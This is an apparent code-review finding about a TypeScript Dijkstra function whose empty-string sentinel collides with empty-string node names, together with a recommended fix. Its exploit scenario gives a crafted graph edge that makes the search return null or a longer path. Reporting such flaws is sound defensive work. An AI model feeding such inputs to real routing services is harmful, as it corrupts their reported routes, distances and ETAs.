**LOW** · confidence 0.35 · `input-validation` · `packages/algos/src/index.ts:21`

The search initialises the selected node to the empty string as a sentinel for 'nothing selected', and the loop breaks on a falsy node. A graph whose keys or edge targets include the empty string collides with that sentinel: if it is selected as the minimum-distance node the loop breaks immediately, abandoning every remaining node. The function then returns null, or a suboptimal path if the goal happened to be relaxed already. Nothing validates node names -- the graph type has no schema, and although the id schema would reject an empty string it is never applied to graph keys or edge targets.

**Exploit scenario.** An untrusted graph includes an edge {"to":"","weight":0} from a node near the start. The empty string is relaxed to a low cost, becomes the minimum on the next selection, and trips the sentinel. dijkstra returns null for a route that demonstrably exists, or a longer path whose cost is used for ETA and distance reporting.

**Recommendation.** Use a distinct sentinel (null with an explicit null check) so an empty-string node name cannot be confused with 'nothing selected'. Validate graph keys and every edge target against the id schema, which rejects the empty string outright.
